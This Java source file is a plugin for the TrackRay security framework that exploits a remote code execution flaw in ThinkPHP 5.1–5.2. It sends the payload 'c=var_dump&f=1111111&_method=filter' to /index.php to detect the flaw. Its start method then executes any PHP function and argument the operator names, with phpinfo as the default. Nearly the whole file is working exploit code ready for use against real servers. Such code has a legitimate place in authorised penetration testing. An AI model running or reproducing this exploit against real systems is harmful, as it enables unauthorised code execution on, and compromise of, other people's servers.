package com.trackray.module.plugin.webapp.thinkphp;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Param;
import com.trackray.base.annotation.Rule;
import com.trackray.base.enums.HttpMethod;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;
import com.trackray.base.utils.StrUtils;

import java.util.Map;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2019/1/17 19:51
 */
@Rule( type = AbstractPlugin.Type.HTML ,
        params = {
                @Param(key = "target", desc = "目标地址"),
                @Param(key = "func",defaultValue = "phpinfo" , desc = "执行函数"),
                @Param(key = "var",defaultValue = "1" , desc = "函数参数"),
        })
@Plugin(title = "Thinkphp 5.1-5.2 远程代码执行" ,
        desc = "" ,
        author = "浅蓝" ,
        link = {"https://www.secpulse.com/archives/95248.html",
                "http://115.198.56.141:19300/wordpress/index.php/2019/01/15/thinkphp5-1-5-2-rec/"})
public class Thinkphp51and52RCE extends CommonPlugin<String> {

    public static String url_1 = "/index.php";
    public static String payload = "c=var_dump&f=1111111&_method=filter";


    @Override
    public boolean check(Map<String, Object> param) {
        crawlerPage.getRequest().setUrl(param.get(currentParams()[0].key()).toString()+url_1);
        crawlerPage.getRequest().setParamMap(StrUtils.paramToMap(payload));
        crawlerPage.getRequest().setHttpMethod(HttpMethod.POST);
        fetcher.run(crawlerPage);
        String str = crawlerPage.getResponse().getStatus().getContentString();
        if (str.contains("11111")){
            return true;
        }
        errorMsg = "不存在该漏洞";
        return false;
    }

    @Override
    public String start() {
        Map<String, String> map = StrUtils.paramToMap(payload);
        map.put("c",param.get(currentParams()[1].key()).toString());
        map.put("f",param.get(currentParams()[2].key()).toString());
        crawlerPage.getRequest().setParamMap(map);
        fetcher.run(crawlerPage);
        String str = crawlerPage.getResponse().getStatus().getContentString();
        return str;
    }
}
